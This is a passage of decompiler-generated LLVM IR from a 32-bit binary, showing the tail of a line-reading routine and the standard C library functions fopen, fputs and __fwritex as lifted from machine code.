  %v1_804d863 = add i8 %v3_804d860, -1
  %v2_804d866 = or i8 %v1_804d863, %v3_804d860
  store i8 %v2_804d866, i8* %v2_804d860, align 1
  %v4_804d86b = icmp eq i32 %stack_var_-24.0, 0
  br i1 %v4_804d86b, label %dec_label_pc_804d87e, label %dec_label_pc_804d872

dec_label_pc_804d872:                             ; preds = %dec_label_pc_804d860
  %v0_804d875 = load i32, i32* @esi, align 4
  %v2_804d876 = call i32 @__unlockfile(i32 %v0_804d875)
  br label %dec_label_pc_804d87e

dec_label_pc_804d87e:                             ; preds = %dec_label_pc_804d860, %dec_label_pc_804d872
  br i1 %v8_804d851, label %dec_label_pc_804d892, label %dec_label_pc_804d965

dec_label_pc_804d892:                             ; preds = %dec_label_pc_804d87e
  store i32 %v4_804d852, i32* @edx, align 4
  store i8 0, i8* %arg1, align 1
  br label %dec_label_pc_804d965

dec_label_pc_804d89e:                             ; preds = %dec_label_pc_804d89e.lr.ph, %dec_label_pc_804d92e
  %stack_var_-20.0.in17 = phi i32 [ %v1_804d84e, %dec_label_pc_804d89e.lr.ph ], [ %v1_804d92e, %dec_label_pc_804d92e ]
  %v0_804d89e = load i32, i32* @esi, align 4
  %v1_804d89e = add i32 %v0_804d89e, 4
  %v2_804d89e = inttoptr i32 %v1_804d89e to i32*
  %v3_804d89e = load i32, i32* %v2_804d89e, align 4
  %v1_804d8a2 = add i32 %v0_804d89e, 8
  %v2_804d8a2 = inttoptr i32 %v1_804d8a2 to i32*
  %v3_804d8a2 = load i32, i32* %v2_804d8a2, align 4
  %v2_804d8a5 = sub i32 %v3_804d8a2, %v3_804d89e
  %v5_804d8aa = inttoptr i32 %v3_804d89e to i8*
  %v6_804d8ab = call i32 @memchr(i8* %v5_804d8aa, i32 10, i32 %v2_804d8a5)
  %v1_804d8b3 = icmp eq i32 %v6_804d8ab, 0
  %v0_804d8bf = load i32, i32* @esi, align 4
  br i1 %v1_804d8b3, label %dec_label_pc_804d8bf, label %dec_label_pc_804d8b9

dec_label_pc_804d8b9:                             ; preds = %dec_label_pc_804d89e
  %v2_804d8b9 = add i32 %v0_804d8bf, 4
  %v3_804d8b9 = inttoptr i32 %v2_804d8b9 to i32*
  %v4_804d8b9 = load i32, i32* %v3_804d8b9, align 4
  %v5_804d8b9 = sub i32 %v6_804d8ab, %v4_804d8b9
  %v1_804d8bc = add i32 %v5_804d8b9, 1
  br label %dec_label_pc_804d8c5

dec_label_pc_804d8bf:                             ; preds = %dec_label_pc_804d89e
  %v1_804d8bf = add i32 %v0_804d8bf, 8
  %v2_804d8bf = inttoptr i32 %v1_804d8bf to i32*
  %v3_804d8bf = load i32, i32* %v2_804d8bf, align 4
  %v2_804d8c2 = add i32 %v0_804d8bf, 4
  %v3_804d8c2 = inttoptr i32 %v2_804d8c2 to i32*
  %v4_804d8c2 = load i32, i32* %v3_804d8c2, align 4
  %v5_804d8c2 = sub i32 %v3_804d8bf, %v4_804d8c2
  br label %dec_label_pc_804d8c5

dec_label_pc_804d8c5:                             ; preds = %dec_label_pc_804d8b9, %dec_label_pc_804d8bf
  %v2_804d8d3.pre-phi = phi i32* [ %v3_804d8b9, %dec_label_pc_804d8b9 ], [ %v3_804d8c2, %dec_label_pc_804d8bf ]
  %storemerge7.in = phi i32 [ %v1_804d8bc, %dec_label_pc_804d8b9 ], [ %v5_804d8c2, %dec_label_pc_804d8bf ]
  %tmp34 = icmp ule i32 %storemerge7.in, %stack_var_-20.0.in17
  %v0_804d8c9.stack_var_-20.0.in = select i1 %tmp34, i32 %storemerge7.in, i32 %stack_var_-20.0.in17
  store i32 %v0_804d8c9.stack_var_-20.0.in, i32* %ebx.global-to-local, align 4
  %v3_804d8d3 = load i32, i32* %v2_804d8d3.pre-phi, align 4
  %v0_804d8d6 = load i32, i32* @edi, align 4
  %v5_804d8d6 = inttoptr i32 %v0_804d8d6 to i8*
  %v2_804d8d7 = add i32 %v0_804d8d6, %v0_804d8c9.stack_var_-20.0.in
  store i32 %v2_804d8d7, i32* @edi, align 4
  %v6_804d8d9 = call i32 @memcpy(i8* %v5_804d8d6, i32 %v3_804d8d3, i32 %v0_804d8c9.stack_var_-20.0.in)
  %v0_804d8de = load i32, i32* @esi, align 4
  %v1_804d8de = add i32 %v0_804d8de, 4
  %v2_804d8de = inttoptr i32 %v1_804d8de to i32*
  %v3_804d8de = load i32, i32* %v2_804d8de, align 4
  %v1_804d8e1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d8e1 = add i32 %v1_804d8e1, %v3_804d8de
  store i32 %v2_804d8e1, i32* @eax, align 4
  store i32 %v2_804d8e1, i32* %v2_804d8de, align 4
  %v1_804d8ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d8ed = sub i32 %stack_var_-20.0.in17, %v1_804d8ed
  store i32 %v2_804d8ed, i32* @edx, align 4
  store i32 %v2_804d8ed, i32* @ebx, align 4
  %v1_804d8f3 = icmp eq i1 %v1_804d8b3, false
  br i1 %v1_804d8f3, label %dec_label_pc_804d93e, label %dec_label_pc_804d8f5

dec_label_pc_804d8f5:                             ; preds = %dec_label_pc_804d8c5
  %v12_804d8ed = icmp eq i32 %v2_804d8ed, 0
  br i1 %v12_804d8ed, label %dec_label_pc_804d93e, label %dec_label_pc_804d8f9

dec_label_pc_804d8f9:                             ; preds = %dec_label_pc_804d8f5
  %v0_804d8f9 = load i32, i32* @eax, align 4
  %v1_804d8f9 = load i32, i32* @esi, align 4
  %v2_804d8f9 = add i32 %v1_804d8f9, 8
  %v3_804d8f9 = inttoptr i32 %v2_804d8f9 to i32*
  %v4_804d8f9 = load i32, i32* %v3_804d8f9, align 4
  %v10_804d8f9 = icmp ult i32 %v0_804d8f9, %v4_804d8f9
  %v1_804d8fc = icmp eq i1 %v10_804d8f9, false
  br i1 %v1_804d8fc, label %dec_label_pc_804d907, label %dec_label_pc_804d8fe

dec_label_pc_804d8fe:                             ; preds = %dec_label_pc_804d8f9
  %v1_804d8fe = inttoptr i32 %v0_804d8f9 to i8*
  %v2_804d8fe = load i8, i8* %v1_804d8fe, align 1
  %v3_804d8fe = zext i8 %v2_804d8fe to i32
  store i32 %v3_804d8fe, i32* @edx, align 4
  %v1_804d901 = add i32 %v0_804d8f9, 1
  %v2_804d902 = add i32 %v1_804d8f9, 4
  %v3_804d902 = inttoptr i32 %v2_804d902 to i32*
  store i32 %v1_804d901, i32* %v3_804d902, align 4
  %v0_804d926.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804d926

dec_label_pc_804d907:                             ; preds = %dec_label_pc_804d8f9
  %v2_804d90b = call i32 @__uflow(i32 %v1_804d8f9)
  %v3_804d90b = trunc i32 %v2_804d90b to i8
  %v3_804d913 = icmp slt i8 %v3_804d90b, 0
  %sext = mul i32 %v2_804d90b, 16777216
  %v1_804d915 = sdiv i32 %sext, 16777216
  store i32 %v1_804d915, i32* @edx, align 4
  %v1_804d917 = icmp eq i1 %v3_804d913, false
  br i1 %v1_804d917, label %dec_label_pc_804d926, label %dec_label_pc_804d919

dec_label_pc_804d919:                             ; preds = %dec_label_pc_804d907
  %v0_804d919 = load i32, i32* @edi, align 4
  %v16_804d919 = icmp eq i32 %v0_804d919, %v4_804d852
  br i1 %v16_804d919, label %dec_label_pc_804d952, label %dec_label_pc_804d91f

dec_label_pc_804d91f:                             ; preds = %dec_label_pc_804d919
  %v0_804d91f = load i32, i32* @esi, align 4
  %v1_804d91f = inttoptr i32 %v0_804d91f to i8*
  %v2_804d91f = load i8, i8* %v1_804d91f, align 1
  %v3_804d91f = and i8 %v2_804d91f, 16
  %v4_804d91f = icmp eq i8 %v3_804d91f, 0
  br i1 %v4_804d91f, label %dec_label_pc_804d952, label %dec_label_pc_804d93e

dec_label_pc_804d926:                             ; preds = %dec_label_pc_804d907, %dec_label_pc_804d8fe
  %v0_804d926 = phi i32 [ %v1_804d915, %dec_label_pc_804d907 ], [ %v0_804d926.pre, %dec_label_pc_804d8fe ]
  %v1_804d926 = trunc i32 %v0_804d926 to i8
  %v2_804d926 = load i32, i32* @edi, align 4
  %v3_804d926 = inttoptr i32 %v2_804d926 to i8*
  store i8 %v1_804d926, i8* %v3_804d926, align 1
  %v0_804d928 = load i32, i32* @edi, align 4
  %v1_804d928 = add i32 %v0_804d928, 1
  store i32 %v1_804d928, i32* @edi, align 4
  %v0_804d929 = load i32, i32* @edx, align 4
  %v1_804d929 = trunc i32 %v0_804d929 to i8
  %v10_804d929 = icmp eq i8 %v1_804d929, 10
  br i1 %v10_804d929, label %dec_label_pc_804d93e, label %dec_label_pc_804d92e

dec_label_pc_804d92e:                             ; preds = %dec_label_pc_804d926
  %v0_804d92e = load i32, i32* @ebx, align 4
  %v1_804d92e = add i32 %v0_804d92e, -1
  %v8_804d92e = icmp eq i32 %v1_804d92e, 0
  store i32 %v1_804d92e, i32* @ebx, align 4
  %v1_804d938 = icmp eq i1 %v8_804d92e, false
  br i1 %v1_804d938, label %dec_label_pc_804d89e, label %dec_label_pc_804d93e

dec_label_pc_804d93e:                             ; preds = %dec_label_pc_804d92e, %dec_label_pc_804d8c5, %dec_label_pc_804d8f5, %dec_label_pc_804d926, %dec_label_pc_804d91f
  %v5_804d93e = icmp eq i8* %arg1, null
  br i1 %v5_804d93e, label %dec_label_pc_804d952, label %dec_label_pc_804d945

dec_label_pc_804d945:                             ; preds = %dec_label_pc_804d93e
  %v0_804d945 = load i32, i32* @edi, align 4
  %v1_804d945 = inttoptr i32 %v0_804d945 to i8*
  store i8 0, i8* %v1_804d945, align 1
  br label %dec_label_pc_804d952

dec_label_pc_804d952:                             ; preds = %dec_label_pc_804d919, %dec_label_pc_804d91f, %dec_label_pc_804d93e, %dec_label_pc_804d945
  %stack_var_4.0 = phi i8* [ null, %dec_label_pc_804d93e ], [ %arg1, %dec_label_pc_804d945 ], [ null, %dec_label_pc_804d91f ], [ null, %dec_label_pc_804d919 ]
  %v4_804d952 = icmp eq i32 %stack_var_-24.0, 0
  br i1 %v4_804d952, label %dec_label_pc_804d965, label %dec_label_pc_804d959

dec_label_pc_804d959:                             ; preds = %dec_label_pc_804d952
  %v0_804d95c = load i32, i32* @esi, align 4
  %v2_804d95d = call i32 @__unlockfile(i32 %v0_804d95c)
  br label %dec_label_pc_804d965

dec_label_pc_804d965:                             ; preds = %dec_label_pc_804d87e, %dec_label_pc_804d952, %dec_label_pc_804d892, %dec_label_pc_804d959
  %stack_var_4.1 = phi i8* [ %stack_var_4.0, %dec_label_pc_804d952 ], [ %stack_var_4.0, %dec_label_pc_804d959 ], [ %arg1, %dec_label_pc_804d892 ], [ null, %dec_label_pc_804d87e ]
  %v4_804d965 = ptrtoint i8* %stack_var_4.1 to i32
  store i32 %v0_804d823, i32* @ebx, align 4
  store i32 %v0_804d822, i32* @esi, align 4
  store i32 %v0_804d821, i32* @edi, align 4
  ret i32 %v4_804d965

; uselistorder directives
  uselistorder i32 %v1_804d92e, { 2, 1, 0 }
  uselistorder i32 %v1_804d915, { 1, 0 }
  uselistorder i32 %v0_804d8f9, { 1, 0, 2 }
  uselistorder i32 %v2_804d8ed, { 2, 0, 1 }
  uselistorder i32 %v0_804d8c9.stack_var_-20.0.in, { 1, 0, 2 }
  uselistorder i32 %storemerge7.in, { 1, 0 }
  uselistorder i32 %v0_804d8bf, { 1, 2, 0 }
  uselistorder i1 %v1_804d8b3, { 1, 0 }
  uselistorder i32 %stack_var_-20.0.in17, { 1, 2, 0 }
  uselistorder i32 %stack_var_-24.0, { 1, 0 }
  uselistorder i32 %v0_804d84e, { 2, 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_804d965, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804d952, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d93e, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_804d8c5, { 1, 0 }
  uselistorder label %dec_label_pc_804d89e, { 1, 0 }
  uselistorder label %dec_label_pc_804d87e, { 1, 0 }
  uselistorder label %dec_label_pc_804d84e, { 1, 0 }
}

define i32 @fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8*, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d974 = load i32, i32* @ebp, align 4
  %v0_804d975 = load i32, i32* @edi, align 4
  %v0_804d976 = load i32, i32* @esi, align 4
  %v0_804d977 = load i32, i32* @ebx, align 4
  store i32 %v0_804d977, i32* %stack_var_-16, align 4
  %v4_804d97b = ptrtoint i8* %arg2 to i32
  store i32 %v4_804d97b, i32* @ebp, align 4
  %v2_804d97f = load i8, i8* %arg2, align 1
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80545b8.369, i32 0, i32 0), i8** %stack_var_-44, align 4
  %v5_804d989 = call i32 @strchr(i32 ptrtoint ([4 x i8]* @global_var_80545b8.369 to i32), i8 %v2_804d97f)
  %v1_804d991 = icmp eq i32 %v5_804d989, 0
  %v1_804d993 = icmp eq i1 %v1_804d991, false
  br i1 %v1_804d993, label %dec_label_pc_804d9a4, label %dec_label_pc_804d995

dec_label_pc_804d995:                             ; preds = %entry
  %v0_804d995 = load i8*, i8** %stack_var_-44, align 4
  %v1_804d995 = ptrtoint i8* %v0_804d995 to i32
  %v2_804d995 = call i32 @__errno_location(i32 %v1_804d995)
  store i32 0, i32* @ecx, align 4
  %v1_804d99c = inttoptr i32 %v2_804d995 to i32*
  store i32 22, i32* %v1_804d99c, align 4
  br label %dec_label_pc_804da12

dec_label_pc_804d9a4:                             ; preds = %entry
  store i32 438, i32* @edi, align 4
  %v0_804d9ac = load i32, i32* @ebp, align 4
  %v5_804d9ac = inttoptr i32 %v0_804d9ac to i8*
  store i8* %v5_804d9ac, i8** %stack_var_-44, align 4
  %v0_804d9ad = call i32 @__fmodeflags()
  store i32 %arg1, i32* @edx, align 4
  store i32 %v0_804d9ad, i32* %esi.global-to-local, align 4
  store i32 5, i32* @eax, align 4
  %v2_804d9c2 = call i32 @__vsyscall(i32 %v0_804d9ac)
  %v4_804d9c7 = inttoptr i32 %v2_804d9c2 to i8*
  store i8* %v4_804d9c7, i8** %stack_var_-44, align 4
  %v2_804d9ca = call i32 @__syscall_ret(i32 %v2_804d9c2)
  store i32 0, i32* @ecx, align 4
  %v2_804d9d4 = icmp slt i32 %v2_804d9ca, 0
  store i32 %v2_804d9ca, i32* @ebx, align 4
  br i1 %v2_804d9d4, label %dec_label_pc_804da12, label %dec_label_pc_804d9da

dec_label_pc_804d9da:                             ; preds = %dec_label_pc_804d9a4
  %v0_804d9da = load i32, i32* %esi.global-to-local, align 4
  %v1_804d9da = and i32 %v0_804d9da, 524288
  %v2_804d9da = icmp eq i32 %v1_804d9da, 0
  store i32 %v1_804d9da, i32* @esi, align 4
  br i1 %v2_804d9da, label %dec_label_pc_804d9f4, label %dec_label_pc_804d9e2

dec_label_pc_804d9e2:                             ; preds = %dec_label_pc_804d9da
  store i32 221, i32* @eax, align 4
  %v0_804d9e9 = load i32, i32* @edi, align 4
  %v1_804d9e9 = and i32 %v0_804d9e9, -65536
  %v2_804d9e9 = or i32 %v1_804d9e9, 1
  store i32 %v2_804d9e9, i32* @edi, align 4
  store i32 %v2_804d9ca, i32* @edx, align 4
  %v0_804d9ef = load i8*, i8** %stack_var_-44, align 4
  %v1_804d9ef = ptrtoint i8* %v0_804d9ef to i32
  %v2_804d9ef = call i32 @__vsyscall(i32 %v1_804d9ef)
  %v0_804d9f7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d9f4

dec_label_pc_804d9f4:                             ; preds = %dec_label_pc_804d9da, %dec_label_pc_804d9e2
  %v0_804d9f4 = phi i32 [ %v2_804d9ca, %dec_label_pc_804d9da ], [ %v2_804d9ef, %dec_label_pc_804d9e2 ]
  %v0_804d9f7 = phi i32 [ %v2_804d9ca, %dec_label_pc_804d9da ], [ %v0_804d9f7.pre, %dec_label_pc_804d9e2 ]
  %v5_804d9f7 = inttoptr i32 %v0_804d9f7 to i8*
  store i8* %v5_804d9f7, i8** %stack_var_-44, align 4
  %v4_804d9f8 = inttoptr i32 %v0_804d9f4 to i8*
  %v5_804d9f8 = call i32 @__fdopen(i32 %v0_804d9f7, i8* %v4_804d9f8, i32 %v0_804d9f4)
  %v1_804da00 = icmp eq i32 %v5_804d9f8, 0
  store i32 %v5_804d9f8, i32* @ecx, align 4
  %v1_804da04 = icmp eq i1 %v1_804da00, false
  br i1 %v1_804da04, label %dec_label_pc_804da12, label %dec_label_pc_804da06

dec_label_pc_804da06:                             ; preds = %dec_label_pc_804d9f4
  store i32 6, i32* @eax, align 4
  %v0_804da0b = load i32, i32* @ebx, align 4
  store i32 %v0_804da0b, i32* @edx, align 4
  %v0_804da0d = load i8*, i8** %stack_var_-44, align 4
  %v1_804da0d = ptrtoint i8* %v0_804da0d to i32
  %v2_804da0d = call i32 @__vsyscall(i32 %v1_804da0d)
  br label %dec_label_pc_804da12

dec_label_pc_804da12:                             ; preds = %dec_label_pc_804d9f4, %dec_label_pc_804d9a4, %dec_label_pc_804d995, %dec_label_pc_804da06
  %v0_804da15 = load i32, i32* @ecx, align 4
  %v2_804da17 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804da17, i32* @ebx, align 4
  store i32 %v0_804d976, i32* @esi, align 4
  store i32 %v0_804d975, i32* @edi, align 4
  store i32 %v0_804d974, i32* @ebp, align 4
  ret i32 %v0_804da15

; uselistorder directives
  uselistorder i32 %v0_804d9f7, { 1, 0 }
  uselistorder i8** %stack_var_-44, { 5, 3, 6, 2, 1, 4, 0 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804da12, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d9f4, { 1, 0 }
}

define i32 @fputs(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804da1c = load i32, i32* @ebx, align 4
  store i32 %v0_804da1c, i32* %stack_var_-4, align 4
  %v4_804da20 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804da20, i32* @ebx, align 4
  %v3_804da25 = call i32 @strlen(i8* %arg1)
  %v0_804da31 = load i32, i32* @ebx, align 4
  %v5_804da32 = sext i32 %v3_804da25 to i64
  %v6_804da32 = call i32 @fwrite(i32 %v0_804da31, i64 %v5_804da32, i32 1, i32 %arg2)
  %v2_804da3a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804da3a, i32* @ebx, align 4
  %v1_804da3b = add i32 %v6_804da32, -1
  ret i32 %v1_804da3b

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__fwritex(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %v0_804da40 = load i32, i32* @ebp, align 4
  %v0_804da41 = load i32, i32* @edi, align 4
  %v0_804da42 = load i32, i32* @esi, align 4
  %v0_804da43 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @esi, align 4
  %v1_804da53 = add i32 %arg3, 16
  %v2_804da53 = inttoptr i32 %v1_804da53 to i32*
  %v3_804da53 = load i32, i32* %v2_804da53, align 4
  %v4_804da53 = icmp eq i32 %v3_804da53, 0
  %v1_804da57 = icmp eq i1 %v4_804da53, false
  br i1 %v1_804da57, label %dec_label_pc_804da6b, label %dec_label_pc_804da59

dec_label_pc_804da59:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  %v1_804da5f = inttoptr i32 %arg3 to i32*
  %v2_804da5f = call i32 @__towrite(i32* %v1_804da5f)
  store i32 %v2_804da5f, i32* %eax.global-to-local, align 4
  %v1_804da67 = icmp eq i32 %v2_804da5f, 0
  %v1_804da69 = icmp eq i1 %v1_804da67, false
  br i1 %v1_804da69, label %dec_label_pc_804dace, label %dec_label_pc_804da59.dec_label_pc_804da6b_crit_edge

dec_label_pc_804da59.dec_label_pc_804da6b_crit_edge: ; preds = %dec_label_pc_804da59
  %v0_804da6b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v0_804da71.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804da6b

dec_label_pc_804da6b:                             ; preds = %dec_label_pc_804da59.dec_label_pc_804da6b_crit_edge, %entry
  %v0_804da71 = phi i32 [ %v0_804da71.pre, %dec_label_pc_804da59.dec_label_pc_804da6b_crit_edge ], [ %arg2, %entry ]
  %v0_804da7d = phi i32 [ %v0_804da6b.pre, %dec_label_pc_804da59.dec_label_pc_804da6b_crit_edge ], [ %arg3, %entry ]
  %v1_804da6b = add i32 %v0_804da7d, 16
  %v2_804da6b = inttoptr i32 %v1_804da6b to i32*
  %v3_804da6b = load i32, i32* %v2_804da6b, align 4
  store i32 %v3_804da6b, i32* %eax.global-to-local, align 4
  %v2_804da6e = add i32 %v0_804da7d, 20
  %v3_804da6e = inttoptr i32 %v2_804da6e to i32*
  %v4_804da6e = load i32, i32* %v3_804da6e, align 4
  %v5_804da6e = sub i32 %v3_804da6b, %v4_804da6e
  store i32 %v5_804da6e, i32* %eax.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_804da71, %v5_804da6e
  br i1 %tmp, label %dec_label_pc_804da75, label %dec_label_pc_804da8d

dec_label_pc_804da75:                             ; preds = %dec_label_pc_804da6b
  %v1_804da81 = add i32 %v0_804da7d, 36
  %v2_804da81 = inttoptr i32 %v1_804da81 to i32*
  %v3_804da81 = load i32, i32* %v2_804da81, align 4
  store i32 %v3_804da81, i32* @ecx, align 4
  store i32 %v0_804da43, i32* %ebx.global-to-local, align 4
  store i32 %v0_804da42, i32* @esi, align 4
  store i32 %v0_804da41, i32* @edi, align 4
  store i32 %v0_804da40, i32* %ebp.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_804da81)
  br label %dec_label_pc_804da8d

dec_label_pc_804da8d:                             ; preds = %dec_label_pc_804da6b, %dec_label_pc_804da75
  %v4_804daad = phi i32 [ %v0_804da7d, %dec_label_pc_804da6b ], [ %v0_804da43, %dec_label_pc_804da75 ]
  store i32 0, i32* %ebp.global-to-local, align 4
  %v1_804da8f = add i32 %v4_804daad, 75
  %v2_804da8f = inttoptr i32 %v1_804da8f to i8*
  %v3_804da8f = load i8, i8* %v2_804da8f, align 1
  %v5_804da8f = icmp slt i8 %v3_804da8f, 0
  br i1 %v5_804da8f, label %dec_label_pc_804da8d.dec_label_pc_804dabb_crit_edge, label %dec_label_pc_804da95

dec_label_pc_804da8d.dec_label_pc_804dabb_crit_edge: ; preds = %dec_label_pc_804da8d
  %v1_804dabc.pre = load i32, i32* @esi, align 4
  %v0_804dabf.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804dabb

dec_label_pc_804da95:                             ; preds = %dec_label_pc_804da8d
  %v0_804da95 = load i32, i32* @edi, align 4
  %v1_804da95 = load i32, i32* @esi, align 4
  store i32 %v1_804da95, i32* %ebp.global-to-local, align 4
  %v1_804da9d1 = icmp eq i32 %v1_804da95, 0
  br i1 %v1_804da9d1, label %dec_label_pc_804dabb, label %dec_label_pc_804daa1.lr.ph

dec_label_pc_804daa1.lr.ph:                       ; preds = %dec_label_pc_804da95
  %v2_804da95 = add i32 %v1_804da95, %v0_804da95
  %v5_804daa1.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804daa1

dec_label_pc_804da9c:                             ; preds = %dec_label_pc_804daa1
  %v1_804da9c = add i32 %v0_804da9c, -1
  %v8_804da9c = icmp eq i32 %v1_804da9c, 0
  store i32 %v1_804da9c, i32* %ebp.global-to-local, align 4
  br i1 %v8_804da9c, label %dec_label_pc_804dabb, label %dec_label_pc_804daa1

dec_label_pc_804daa1:                             ; preds = %dec_label_pc_804daa1.lr.ph, %dec_label_pc_804da9c
  %v0_804da9c = phi i32 [ %v1_804da95, %dec_label_pc_804daa1.lr.ph ], [ %v1_804da9c, %dec_label_pc_804da9c ]
  %v5_804daa1 = phi i32 [ %v5_804daa1.pre, %dec_label_pc_804daa1.lr.ph ], [ %v7_804daa1, %dec_label_pc_804da9c ]
  %v0_804daa4 = phi i32 [ %v2_804da95, %dec_label_pc_804daa1.lr.ph ], [ %v1_804daa1, %dec_label_pc_804da9c ]
  %v1_804daa1 = add i32 %v0_804daa4, -1
  %v2_804daa1 = inttoptr i32 %v1_804daa1 to i8*
  %v3_804daa1 = load i8, i8* %v2_804daa1, align 1
  %v4_804daa1 = zext i8 %v3_804daa1 to i32
  %v6_804daa1 = and i32 %v5_804daa1, -256
  %v7_804daa1 = or i32 %v4_804daa1, %v6_804daa1
  store i32 %v7_804daa1, i32* %eax.global-to-local, align 4
  store i32 %v1_804daa1, i32* @edx, align 4
  %v10_804daa5 = icmp eq i8 %v3_804daa1, 10
  %v1_804daa7 = icmp eq i1 %v10_804daa5, false
  br i1 %v1_804daa7, label %dec_label_pc_804da9c, label %dec_label_pc_804daa9

dec_label_pc_804daa9:                             ; preds = %dec_label_pc_804daa1
  %v5_804daad = add i32 %v4_804daad, 36
  %v6_804daad = inttoptr i32 %v5_804daad to i32*
  %v7_804daad = load i32, i32* %v6_804daad, align 4
  call void @__pseudo_call(i32 %v7_804daad)
  %v0_804dab3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dab3 = load i32, i32* %ebp.global-to-local, align 4
  %v7_804dab3 = icmp ult i32 %v0_804dab3, %v1_804dab3
  br i1 %v7_804dab3, label %dec_label_pc_804dace, label %dec_label_pc_804dab7

dec_label_pc_804dab7:                             ; preds = %dec_label_pc_804daa9
  %v0_804dab7 = load i32, i32* @edi, align 4
  %v2_804dab7 = add i32 %v0_804dab7, %v1_804dab3
  store i32 %v2_804dab7, i32* @edi, align 4
  %v0_804dab9 = load i32, i32* @esi, align 4
  %v2_804dab9 = sub i32 %v0_804dab9, %v1_804dab3
  store i32 %v2_804dab9, i32* @esi, align 4
  %v0_804dac0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dabb

dec_label_pc_804dabb:                             ; preds = %dec_label_pc_804da9c, %dec_label_pc_804da95, %dec_label_pc_804da8d.dec_label_pc_804dabb_crit_edge, %dec_label_pc_804dab7
  %v0_804dac0 = phi i32 [ %v4_804daad, %dec_label_pc_804da8d.dec_label_pc_804dabb_crit_edge ], [ %v0_804dac0.pre, %dec_label_pc_804dab7 ], [ %v4_804daad, %dec_label_pc_804da95 ], [ %v4_804daad, %dec_label_pc_804da9c ]
  %v0_804dabf = phi i32 [ %v0_804dabf.pre, %dec_label_pc_804da8d.dec_label_pc_804dabb_crit_edge ], [ %v2_804dab7, %dec_label_pc_804dab7 ], [ %v0_804da95, %dec_label_pc_804da95 ], [ %v0_804da95, %dec_label_pc_804da9c ]
  %v0_804dabe = phi i32 [ %v1_804dabc.pre, %dec_label_pc_804da8d.dec_label_pc_804dabb_crit_edge ], [ %v2_804dab9, %dec_label_pc_804dab7 ], [ 0, %dec_label_pc_804da95 ], [ %v1_804da95, %dec_label_pc_804da9c ]
  %v0_804dabc = phi i32 [ 0, %dec_label_pc_804da8d.dec_label_pc_804dabb_crit_edge ], [ %v1_804dab3, %dec_label_pc_804dab7 ], [ 0, %dec_label_pc_804da95 ], [ 0, %dec_label_pc_804da9c ]
  %v2_804dabc = add i32 %v0_804dabc, %v0_804dabe
  store i32 %v2_804dabc, i32* %ebp.global-to-local, align 4
  %v1_804dac0 = add i32 %v0_804dac0, 20
  %v2_804dac0 = inttoptr i32 %v1_804dac0 to i32*
  %v3_804dac0 = load i32, i32* %v2_804dac0, align 4
  %v3_804dac3 = inttoptr i32 %v3_804dac0 to i8*
  %v4_804dac3 = call i32 @memcpy(i8* %v3_804dac3, i32 %v0_804dabf, i32 %v0_804dabe)
  store i32 %v4_804dac3, i32* %eax.global-to-local, align 4
  %v0_804dacb = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dacb = add i32 %v0_804dacb, 20
  %v2_804dacb = inttoptr i32 %v1_804dacb to i32*
  %v3_804dacb = load i32, i32* %v2_804dacb, align 4
  %v4_804dacb = load i32, i32* @esi, align 4
  %v5_804dacb = add i32 %v4_804dacb, %v3_804dacb
  store i32 %v5_804dacb, i32* %v2_804dacb, align 4
  br label %dec_label_pc_804dace

dec_label_pc_804dace:                             ; preds = %dec_label_pc_804daa9, %dec_label_pc_804da59, %dec_label_pc_804dabb
  %v0_804dad1 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804dad1, i32* %eax.global-to-local, align 4
  store i32 %v0_804da43, i32* @ebx, align 4
  store i32 %v0_804da42, i32* @esi, align 4
  store i32 %v0_804da41, i32* @edi, align 4
  store i32 %v0_804da40, i32* @ebp, align 4
  ret i32 %v0_804dad1

; uselistorder directives
  uselistorder i32 %v0_804dabe, { 1, 0 }
  uselistorder i32 %v1_804dab3, { 1, 2, 0, 3 }
  uselistorder i32 %v7_804daa1, { 1, 0 }
  uselistorder i32 %v1_804daa1, { 0, 2, 1 }
  uselistorder i32 %v1_804da95, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_804da7d, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804da43, { 2, 0, 1 }
  uselistorder i32 %v0_804da42, { 1, 0 }
  uselistorder i32 %v0_804da41, { 1, 0 }
  uselistorder i32 %v0_804da40, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 3, 2, 0, 1, 4 }
  uselistorder i32* %ebp.global-to-local, { 6, 3, 1, 0, 2, 4, 5, 7 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
